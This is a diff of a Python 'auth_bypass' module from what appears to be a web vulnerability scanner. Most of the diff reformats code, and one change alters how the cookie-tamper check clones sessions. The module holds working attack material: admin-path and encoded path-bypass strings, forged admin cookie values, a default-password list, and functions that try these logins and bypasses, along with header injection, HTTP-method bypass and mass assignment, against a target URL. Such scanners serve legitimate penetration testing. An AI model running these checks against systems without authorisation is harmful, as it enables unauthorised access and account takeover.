@@ -8,101 +8,219 @@ from tools.settings import settings
 logger = get_logger("auth_bypass")
 
 ADMIN_PATHS = [
-    "/admin", "/administrator", "/admin.php", "/admin/login",
-    "/wp-admin", "/phpmyadmin", "/manager", "/management",
-    "/panel", "/cpanel", "/console", "/dashboard",
-    "/backend", "/api/admin", "/admin/api", "/admin/panel",
-    "/admin/dashboard", "/admin/console", "/admin/management",
-    "/admin/index.php", "/admin/index.html", "/admin/login.php",
-    "/admin/admin.php", "/admin_area", "/admin_area/admin.php",
-    "/siteadmin", "/admincontrol", "/adminpanel",
-    "/webadmin", "/sysadmin", "/cp", "/controlpanel",
-    "/superadmin", "/admin/pages", "/admin/users",
-    "/admin/settings", "/admin/config", "/admin/system",
-    "/api/v1/admin", "/api/v2/admin", "/graphql",
-    "/jenkins", "/jmx-console", "/actuator",
-    "/swagger-ui.html", "/api-docs", "/api/swagger",
-    "/debug", "/console", "/h2-console",
-    "/zabbix", "/nagios", "/prometheus",
+    "/admin",
+    "/administrator",
+    "/admin.php",
+    "/admin/login",
+    "/wp-admin",
+    "/phpmyadmin",
+    "/manager",
+    "/management",
+    "/panel",
+    "/cpanel",
+    "/console",
+    "/dashboard",
+    "/backend",
+    "/api/admin",
+    "/admin/api",
+    "/admin/panel",
+    "/admin/dashboard",
+    "/admin/console",
+    "/admin/management",
+    "/admin/index.php",
+    "/admin/index.html",
+    "/admin/login.php",
+    "/admin/admin.php",
+    "/admin_area",
+    "/admin_area/admin.php",
+    "/siteadmin",
+    "/admincontrol",
+    "/adminpanel",
+    "/webadmin",
+    "/sysadmin",
+    "/cp",
+    "/controlpanel",
+    "/superadmin",
+    "/admin/pages",
+    "/admin/users",
+    "/admin/settings",
+    "/admin/config",
+    "/admin/system",
+    "/api/v1/admin",
+    "/api/v2/admin",
+    "/graphql",
+    "/jenkins",
+    "/jmx-console",
+    "/actuator",
+    "/swagger-ui.html",
+    "/api-docs",
+    "/api/swagger",
+    "/debug",
+    "/console",
+    "/h2-console",
+    "/zabbix",
+    "/nagios",
+    "/prometheus",
 ]
 
 PATH_BYPASSES = [
     # Basic bypass patterns
-    "/admin", "/admin/", "//admin//", "/./admin",
-    "/admin/.", "/admin%00", "/admin%20", "/ADMIN",
-    "/Admin", "/admin;foo", "/admin..;/", "/*/admin",
-    "/admin/../admin", "/admin/.%00",
+    "/admin",
+    "/admin/",
+    "//admin//",
+    "/./admin",
+    "/admin/.",
+    "/admin%00",
+    "/admin%20",
+    "/ADMIN",
+    "/Admin",
+    "/admin;foo",
+    "/admin..;/",
+    "/*/admin",
+    "/admin/../admin",
+    "/admin/.%00",
     # Advanced path manipulation
-    "/admin%2f", "/admin\\", "/admin/./",
-    "/%2fadmin", "/%2fadmin%2f",
-    "/admin%3f", "/admin%23",
-    "/admin..%00/", "/admin%252f",
-    "/admin;%2f..;%2f", "/admin%ef%bc%8f",
-    "/admin%c0%af", "/admin%c0%ae",
+    "/admin%2f",
+    "/admin\\",
+    "/admin/./",
+    "/%2fadmin",
+    "/%2fadmin%2f",
+    "/admin%3f",
+    "/admin%23",
+    "/admin..%00/",
+    "/admin%252f",
+    "/admin;%2f..;%2f",
+    "/admin%ef%bc%8f",
+    "/admin%c0%af",
+    "/admin%c0%ae",
     # Case variants
-    "/Admin%00", "/ADMIN%00/", "/aDmIn",
-    "/AdMiN", "/adMIN", "/ADmin",
+    "/Admin%00",
+    "/ADMIN%00/",
+    "/aDmIn",
+    "/AdMiN",
+    "/adMIN",
+    "/ADmin",
     # Suffix bypass
-    "/admin.js", "/admin.css", "/admin.json",
-    "/admin.xml", "/admin.txt", "/admin.html",
-    "/admin.htm", "/admin.pdf",
-    "/admin;.js", "/admin;.css",
-    "/admin;.json", "/admin;.xml",
+    "/admin.js",
+    "/admin.css",
+    "/admin.json",
+    "/admin.xml",
+    "/admin.txt",
+    "/admin.html",
+    "/admin.htm",
+    "/admin.pdf",
+    "/admin;.js",
+    "/admin;.css",
+    "/admin;.json",
+    "/admin;.xml",
     # Double encoding
-    "/%2561dmin", "/%2561%2564%256d%2569%256e",
-    "/admin%252e%252e/", "/.%2561dmin",
+    "/%2561dmin",
+    "/%2561%2564%256d%2569%256e",
+    "/admin%252e%252e/",
+    "/.%2561dmin",
     # Unicode bypass
-    "/admin%uffoo", "/admin%u0000",
-    "/ad%6d%69n", "/%61%64%6d%69%6e",
+    "/admin%uffoo",
+    "/admin%u0000",
+    "/ad%6d%69n",
+    "/%61%64%6d%69%6e",
     # IIS short name
-    "/admin~1", "/admin~1.php", "/admin~1.asp",
+    "/admin~1",
+    "/admin~1.php",
+    "/admin~1.asp",
     # Traversal-like
     "/..;/..;/..;/admin",
     "/..%252f..%252f..%252fadmin",
     "/%c0%ae%c0%ae/%c0%ae%c0%ae/admin",
     # Parameter pollution
-    "/?next=/admin", "/?redirect=/admin",
-    "/?url=/admin", "/?page=/admin",
+    "/?next=/admin",
+    "/?redirect=/admin",
+    "/?url=/admin",
+    "/?page=/admin",
 ]
 
 COOKIE_TAMPER_PAYLOADS = [
-    {"admin": "1"}, {"admin": "true"}, {"admin": "True"},
-    {"role": "admin"}, {"role": "administrator"}, {"role": "1"},
-    {"is_admin": "1"}, {"is_admin": "true"}, {"user_type": "admin"},
-    {"group": "admin"}, {"level": "admin"}, {"access": "admin"},
-    {"superuser": "1"}, {"super_admin": "1"},
-    {"admin_level": "1"}, {"administrator": "1"},
-    {"user": "admin"}, {"username": "admin"},
-    {"member": "admin"}, {"member_type": "admin"},
+    {"admin": "1"},
+    {"admin": "true"},
+    {"admin": "True"},
+    {"role": "admin"},
+    {"role": "administrator"},
+    {"role": "1"},
+    {"is_admin": "1"},
+    {"is_admin": "true"},
+    {"user_type": "admin"},
+    {"group": "admin"},
+    {"level": "admin"},
+    {"access": "admin"},
+    {"superuser": "1"},
+    {"super_admin": "1"},
+    {"admin_level": "1"},
+    {"administrator": "1"},
+    {"user": "admin"},
+    {"username": "admin"},
+    {"member": "admin"},
+    {"member_type": "admin"},
     # Additional cookie tamper payloads
-    {"admin": "True"}, {"admin": "yes"}, {"admin": "on"},
-    {"admin": "enabled"}, {"admin": "granted"},
-    {"role": "superadmin"}, {"role": "root"},
-    {"role": "system"}, {"role": "superuser"},
-    {"is_admin": "True"}, {"is_admin": "yes"},
-    {"is_admin": "on"}, {"is_admin": "enabled"},
-    {"user_type": "superadmin"}, {"user_type": "root"},
-    {"group": "wheel"}, {"group": "sudo"}, {"group": "root"},
-    {"level": "10"}, {"level": "999"}, {"level": "9999"},
-    {"access_level": "admin"}, {"access_level": "root"},
-    {"access_level": "10"}, {"access_level": "999"},
-    {"permissions": "admin"}, {"permissions": "*"},
-    {"permissions": "all"}, {"permissions": "read_write"},
-    {"member_type": "owner"}, {"member_type": "moderator"},
+    {"admin": "True"},
+    {"admin": "yes"},
+    {"admin": "on"},
+    {"admin": "enabled"},
+    {"admin": "granted"},
+    {"role": "superadmin"},
+    {"role": "root"},
+    {"role": "system"},
+    {"role": "superuser"},
+    {"is_admin": "True"},
+    {"is_admin": "yes"},
+    {"is_admin": "on"},
+    {"is_admin": "enabled"},
+    {"user_type": "superadmin"},
+    {"user_type": "root"},
+    {"group": "wheel"},
+    {"group": "sudo"},
+    {"group": "root"},
+    {"level": "10"},
+    {"level": "999"},
+    {"level": "9999"},
+    {"access_level": "admin"},
+    {"access_level": "root"},
+    {"access_level": "10"},
+    {"access_level": "999"},
+    {"permissions": "admin"},
+    {"permissions": "*"},
+    {"permissions": "all"},
+    {"permissions": "read_write"},
+    {"member_type": "owner"},
+    {"member_type": "moderator"},
     {"member_type": "administrator"},
-    {"auth": "admin"}, {"auth": "1"}, {"auth": "true"},
-    {"authenticated": "1"}, {"authenticated": "true"},
-    {"logged_in": "1"}, {"logged_in": "true"},
-    {"login": "admin"}, {"login": "1"},
-    {"session": "admin"}, {"session_level": "admin"},
-    {"user_role": "admin"}, {"user_role": "1"},
-    {"uid": "0"}, {"uid": "1"}, {"userid": "0"}, {"userid": "1"},
-    {"user_id": "0"}, {"user_id": "1"},
-    {"isLoggedIn": "true"}, {"isLoggedIn": "1"},
-    {"isAuthenticated": "true"}, {"isAuthenticated": "1"},
-    {"valid": "true"}, {"valid": "1"},
-    {"verified": "true"}, {"verified": "1"},
-    {"email_verified": "true"}, {"email_verified": "1"},
+    {"auth": "admin"},
+    {"auth": "1"},
+    {"auth": "true"},
+    {"authenticated": "1"},
+    {"authenticated": "true"},
+    {"logged_in": "1"},
+    {"logged_in": "true"},
+    {"login": "admin"},
+    {"login": "1"},
+    {"session": "admin"},
+    {"session_level": "admin"},
+    {"user_role": "admin"},
+    {"user_role": "1"},
+    {"uid": "0"},
+    {"uid": "1"},
+    {"userid": "0"},
+    {"userid": "1"},
+    {"user_id": "0"},
+    {"user_id": "1"},
+    {"isLoggedIn": "true"},
+    {"isLoggedIn": "1"},
+    {"isAuthenticated": "true"},
+    {"isAuthenticated": "1"},
+    {"valid": "true"},
+    {"valid": "1"},
+    {"verified": "true"},
+    {"verified": "1"},
+    {"email_verified": "true"},
+    {"email_verified": "1"},
 ]
 
 HEADER_INJECTIONS = [
@@ -187,43 +305,83 @@ MASS_ASSIGN_PAYLOADS = [
 
 # Common default credentials
 DEFAULT_CREDS = [
-    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
-    ("admin", "admin123"), ("admin", "root"), ("admin", "toor"),
-    ("admin", "pass"), ("admin", "admin1"), ("admin", "administrator"),
-    ("root", "root"), ("root", "toor"), ("root", "admin"),
-    ("root", "password"), ("root", ""), ("root", "root123"),
-    ("user", "user"), ("user", "password"), ("user", "123456"),
-    ("test", "test"), ("test", "123456"), ("test", "password"),
-    ("guest", "guest"), ("guest", ""),
-    ("administrator", "administrator"), ("administrator", "admin"),
-    ("admin", "12345678"), ("admin", "111111"), ("admin", "000000"),
-    ("admin", "qwerty"), ("admin", "letmein"),
-    ("admin", "welcome"), ("admin", "monkey"),
-    ("admin", "sunshine"), ("admin", "princess"),
-    ("admin", "football"), ("admin", "iloveyou"),
-    ("admin", "trustno1"), ("admin", "master"),
-    ("admin", "login"), ("admin", "passw0rd"),
-    ("admin", "p@ssword"), ("admin", "P@ssw0rd"),
-    ("admin", "changeme"), ("admin", "temp123"),
-    ("admin", "default"), ("admin", "system"),
-    ("admin", "manager"), ("admin", "server"),
-    ("admin", "backup"), ("admin", "test123"),
+    ("admin", "admin"),
+    ("admin", "password"),
+    ("admin", "123456"),
+    ("admin", "admin123"),
+    ("admin", "root"),
+    ("admin", "toor"),
+    ("admin", "pass"),
+    ("admin", "admin1"),
+    ("admin", "administrator"),
+    ("root", "root"),
+    ("root", "toor"),
+    ("root", "admin"),
+    ("root", "password"),
+    ("root", ""),
+    ("root", "root123"),
+    ("user", "user"),
+    ("user", "password"),
+    ("user", "123456"),
+    ("test", "test"),
+    ("test", "123456"),
+    ("test", "password"),
+    ("guest", "guest"),
+    ("guest", ""),
+    ("administrator", "administrator"),
+    ("administrator", "admin"),
+    ("admin", "12345678"),
+    ("admin", "111111"),
+    ("admin", "000000"),
+    ("admin", "qwerty"),
+    ("admin", "letmein"),
+    ("admin", "welcome"),
+    ("admin", "monkey"),
+    ("admin", "sunshine"),
+    ("admin", "princess"),
+    ("admin", "football"),
+    ("admin", "iloveyou"),
+    ("admin", "trustno1"),
+    ("admin", "master"),
+    ("admin", "login"),
+    ("admin", "passw0rd"),
+    ("admin", "p@ssword"),
+    ("admin", "P@ssw0rd"),
+    ("admin", "changeme"),
+    ("admin", "temp123"),
+    ("admin", "default"),
+    ("admin", "system"),
+    ("admin", "manager"),
+    ("admin", "server"),
+    ("admin", "backup"),
+    ("admin", "test123"),
 ]
 
 LOGIN_ENDPOINTS = [
-    "/login", "/signin", "/auth", "/authenticate",
-    "/api/login", "/api/auth", "/api/v1/login",
-    "/api/v1/auth", "/user/login", "/users/login",
-    "/admin/login", "/admin/login.php",
-    "/wp-login.php", "/administrator/index.php",
-    "/auth/login", "/oauth/token",
-    "/api/token", "/api/v1/token",
-    "/graphql", "/api/graphql",
+    "/login",
+    "/signin",
+    "/auth",
+    "/authenticate",
+    "/api/login",
+    "/api/auth",
+    "/api/v1/login",
+    "/api/v1/auth",
+    "/user/login",
+    "/users/login",
+    "/admin/login",
+    "/admin/login.php",
+    "/wp-login.php",
+    "/administrator/index.php",
+    "/auth/login",
+    "/oauth/token",
+    "/api/token",
+    "/api/v1/token",
+    "/graphql",
+    "/api/graphql",
 ]
 
 
-def _catchall_signature(base: str, sess: requests.Session,
-                        timeout: float):
+def _catchall_signature(base: str, sess: requests.Session, timeout: float):
     """探测 catch-all 服务器: 两个随机路径返回同一 (status, 长度) => 该签名.
 
     SPA / 自定义错误处理器 / WAF 对任意路径都返回同一个 200 页面. 若不识别,
@@ -257,8 +415,9 @@ def _matches_catchall(status: int, length: int, sig) -> bool:
     return abs(length - c_len) <= max(5, int(c_len * 0.02))
 
 
-def check_admin_endpoints(url: str, sess: Optional[requests.Session] = None,
-                          timeout: float = 10.0) -> List[Dict]:
+def check_admin_endpoints(
+    url: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> List[Dict]:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -271,15 +430,15 @@ def check_admin_endpoints(url: str, sess: Optional[requests.Session] = None,
             if r.status_code in (200, 301, 302, 403):
                 if _matches_catchall(r.status_code, len(r.text), catchall):
                     continue
-                results.append({"path": path, "status": r.status_code,
-                                "length": len(r.text)})
+                results.append({"path": path, "status": r.status_code, "length": len(r.text)})
         except Exception as e:
             logger.debug("admin endpoint %s: %s", path, e)
     return results
 
 
-def check_path_bypass(url_pattern: str, sess: Optional[requests.Session] = None,
-                      timeout: float = 10.0) -> List[Dict]:
+def check_path_bypass(
+    url_pattern: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> List[Dict]:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -289,8 +448,10 @@ def check_path_bypass(url_pattern: str, sess: Optional[requests.Session] = None,
     for bp in PATH_BYPASSES:
         test_url = url_pattern.replace("/admin", bp) if "/admin" in url_pattern else bp
         try:
-            r = sess.get(test_url if test_url.startswith("http") else url_pattern.rstrip("/") + bp,
-                         timeout=timeout)
+            r = sess.get(
+                test_url if test_url.startswith("http") else url_pattern.rstrip("/") + bp,
+                timeout=timeout,
+            )
             if r.status_code in (200, 301, 302):
                 if _matches_catchall(r.status_code, len(r.text), catchall):
                     continue
@@ -300,8 +461,9 @@ def check_path_bypass(url_pattern: str, sess: Optional[requests.Session] = None,
     return results
 
 
-def check_cookie_tamper(url: str, sess: Optional[requests.Session] = None,
-                        timeout: float = 10.0) -> List[Dict]:
+def check_cookie_tamper(
+    url: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> List[Dict]:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -314,23 +476,33 @@ def check_cookie_tamper(url: str, sess: Optional[requests.Session] = None,
     results = []
     for payload in COOKIE_TAMPER_PAYLOADS:
         try:
-            import requests as _req
-            sess_copy = _req.Session()
+            # Clone only real requests.Session instances. Injected test doubles
+            # and custom clients are used as-is so we never create an
+            # un-mocked network client behind the caller's back.
+            if isinstance(sess, requests.Session):
+                sess_copy = requests.Session()
+                sess_copy.cookies.update(sess.cookies)
+                sess_copy.headers.update(sess.headers)
+                sess_copy.verify = sess.verify
+            else:
+                sess_copy = sess
+            if not hasattr(sess_copy.cookies, "set"):
+                continue
             for cookie in sess.cookies:
                 sess_copy.cookies.set(cookie.name, cookie.value or "")
             for k, v in payload.items():
                 sess_copy.cookies.set(k, v)
             r = sess_copy.get(url, timeout=timeout)
             if r.status_code != baseline.status_code or len(r.text) != len(baseline.text):
-                results.append({"cookie": payload, "status": r.status_code,
-                                "length": len(r.text)})
+                results.append({"cookie": payload, "status": r.status_code, "length": len(r.text)})
         except Exception as e:
             logger.debug("cookie tamper %s: %s", list(payload.keys())[0], e)
     return results
 
 
-def check_header_injection(url: str, sess: Optional[requests.Session] = None,
-                           timeout: float = 10.0) -> List[Dict]:
+def check_header_injection(
+    url: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> List[Dict]:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -345,15 +517,15 @@ def check_header_injection(url: str, sess: Optional[requests.Session] = None,
         try:
             r = sess.get(url, headers=headers, timeout=timeout)
             if r.status_code != baseline.status_code or len(r.text) != len(baseline.text):
-                results.append({"headers": headers, "status": r.status_code,
-                                "length": len(r.text)})
+                results.append({"headers": headers, "status": r.status_code, "length": len(r.text)})
         except Exception as e:
             logger.debug("header injection %s: %s", list(headers.keys())[0], e)
     return results
 
 
-def check_method_bypass(url: str, sess: Optional[requests.Session] = None,
-                        timeout: float = 10.0) -> List[Dict]:
+def check_method_bypass(
+    url: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> List[Dict]:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -368,15 +540,15 @@ def check_method_bypass(url: str, sess: Optional[requests.Session] = None,
         try:
             r = sess.request(method, url, timeout=timeout)
             if r.status_code != baseline.status_code and r.status_code in (200, 201, 204):
-                results.append({"method": method, "status": r.status_code,
-                                "length": len(r.text)})
+                results.append({"method": method, "status": r.status_code, "length": len(r.text)})
         except Exception as e:
             logger.debug("method %s: %s", method, e)
     return results
 
 
-def check_default_creds(url: str, sess: Optional[requests.Session] = None,
-                        timeout: float = 10.0) -> List[Dict]:
+def check_default_creds(
+    url: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> List[Dict]:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -386,29 +558,46 @@ def check_default_creds(url: str, sess: Optional[requests.Session] = None,
         login_url = "%s%s" % (base, endpoint)
         for user, password in DEFAULT_CREDS[:20]:  # Test first 20 to limit time
             try:
-                r = sess.post(login_url, data={"username": user, "password": password,
-                                                "email": user, "user": user, "pass": password,
-                                                "user_login": user, "pwd": password},
-                              timeout=timeout, allow_redirects=False)
-                # Succesful login usually redirects or returns different status
-                if r.status_code in (302, 301) or "token" in r.text.lower()[:500] or \
-                   "session" in r.text.lower()[:500] or "welcome" in r.text.lower()[:200] or \
-                   ("success" in r.text.lower()[:200] and "error" not in r.text.lower()[:200]):
-                    results.append({
-                        "endpoint": login_url,
+                r = sess.post(
+                    login_url,
+                    data={
                         "username": user,
                         "password": password,
-                        "status": r.status_code,
-                        "location": r.headers.get("Location", ""),
-                    })
+                        "email": user,
+                        "user": user,
+                        "pass": password,
+                        "user_login": user,
+                        "pwd": password,
+                    },
+                    timeout=timeout,
+                    allow_redirects=False,
+                )
+                # Succesful login usually redirects or returns different status
+                if (
+                    r.status_code in (302, 301)
+                    or "token" in r.text.lower()[:500]
+                    or "session" in r.text.lower()[:500]
+                    or "welcome" in r.text.lower()[:200]
+                    or ("success" in r.text.lower()[:200] and "error" not in r.text.lower()[:200])
+                ):
+                    results.append(
+                        {
+                            "endpoint": login_url,
+                            "username": user,
+                            "password": password,
+                            "status": r.status_code,
+                            "location": r.headers.get("Location", ""),
+                        }
+                    )
                     break  # Found creds for this endpoint, move on
             except Exception:
                 pass
     return results
 
 
-def check_mass_assignment(url: str, sess: Optional[requests.Session] = None,
-                          timeout: float = 10.0) -> List[Dict]:
+def check_mass_assignment(
+    url: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> List[Dict]:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -416,28 +605,33 @@ def check_mass_assignment(url: str, sess: Optional[requests.Session] = None,
     base = url.rstrip("/")
     for payload in MASS_ASSIGN_PAYLOADS:
         try:
-            r = sess.post(base + "/api/user/update", data=payload,
-                          timeout=timeout, allow_redirects=False)
-            if r.status_code in (200, 201, 202) and \
-               ("success" in r.text.lower()[:300] or "true" in r.text.lower()[:300]):
-                results.append({"endpoint": "/api/user/update", "payload": payload,
-                                "status": r.status_code})
+            r = sess.post(
+                base + "/api/user/update", data=payload, timeout=timeout, allow_redirects=False
+            )
+            if r.status_code in (200, 201, 202) and (
+                "success" in r.text.lower()[:300] or "true" in r.text.lower()[:300]
+            ):
+                results.append(
+                    {"endpoint": "/api/user/update", "payload": payload, "status": r.status_code}
+                )
         except Exception:
             pass
         try:
-            r = sess.post(base + "/user/profile", data=payload,
-                          timeout=timeout, allow_redirects=False)
-            if r.status_code in (200, 201, 202) and \
-               ("success" in r.text.lower()[:300] or "true" in r.text.lower()[:300]):
-                results.append({"endpoint": "/user/profile", "payload": payload,
-                                "status": r.status_code})
+            r = sess.post(
+                base + "/user/profile", data=payload, timeout=timeout, allow_redirects=False
+            )
+            if r.status_code in (200, 201, 202) and (
+                "success" in r.text.lower()[:300] or "true" in r.text.lower()[:300]
+            ):
+                results.append(
+                    {"endpoint": "/user/profile", "payload": payload, "status": r.status_code}
+                )
         except Exception:
             pass
     return results
 
 
-def check(url: str, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0) -> Dict:
+def check(url: str, sess: Optional[requests.Session] = None, timeout: float = 10.0) -> Dict:
     r: Dict[str, Any] = {
         "vulnerable": False,
         "admin_endpoints": [],
